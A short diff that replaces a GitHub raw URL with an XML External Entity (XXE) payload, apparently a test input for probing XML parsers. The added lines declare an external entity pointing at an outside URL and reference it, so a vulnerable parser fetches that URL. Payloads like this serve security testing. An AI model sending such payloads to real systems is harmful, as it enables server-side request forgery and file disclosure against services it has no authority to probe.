@@ -1,1 +1,4 @@
-https://raw.githubusercontent.com/AngelouD/custom-tools/master/test
+<?xml version="1.0" encoding="ISO-8859-1"?>
+  <!DOCTYPE foo [  
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "http://facebook.com" >]><foo>&xxe;</foo>
